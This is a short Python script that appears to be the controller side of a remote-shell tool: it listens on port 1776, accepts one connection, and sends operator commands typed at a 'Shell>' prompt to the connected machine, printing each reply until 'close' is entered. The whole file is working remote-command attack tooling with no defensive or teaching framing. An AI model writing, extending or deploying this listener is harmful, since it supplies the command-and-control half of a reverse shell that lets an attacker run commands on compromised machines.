import socket
import sys

def connect():
    try:
        host_name = socket.gethostname()
        host_ip = socket.gethostbyname(host_name)
    except:
        print("Unable to get Hostname and IP")
    print("Hostname :  ",host_name)
    print("IP : ",host_ip)
    skt = socket.socket()
    skt.bind((host_ip,1776))
    skt.listen(1)
    conn, addr = skt.accept()
    print("Connection from: ", addr)

    while True:
        command = input("Shell> ")
        if 'close' in command:
            conn.send('close'.encode())
            conn.close()
            break
        else:
            conn.send(command.encode())
            print (conn.recv(1024).decode())
def main():
    connect()

if __name__== "__main__":
   main()
